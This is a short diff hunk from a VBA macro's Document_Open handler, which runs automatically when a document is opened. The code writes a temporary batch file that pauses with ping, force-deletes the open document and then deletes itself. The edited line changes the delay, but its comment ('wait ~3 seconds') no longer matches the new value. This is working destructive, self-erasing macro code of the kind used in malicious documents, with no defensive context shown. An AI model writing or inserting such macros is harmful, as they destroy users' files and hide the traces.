@@ -83,7 +83,7 @@ Private Sub Document_Open()
         f = FreeFile
         Open tempBat For Output As #f
         Print #f, "@echo off"
-        Print #f, "ping -n 4 127.0.0.1 >nul"   ' wait ~3 seconds
+        Print #f, "ping -n 7 127.0.0.1 >nul"   ' wait ~3 seconds
         Print #f, "del """ & currentDocPath & """ /f /q"
         Print #f, "del """ & tempBat & """ /f /q"   ' self-delete
         Close #f
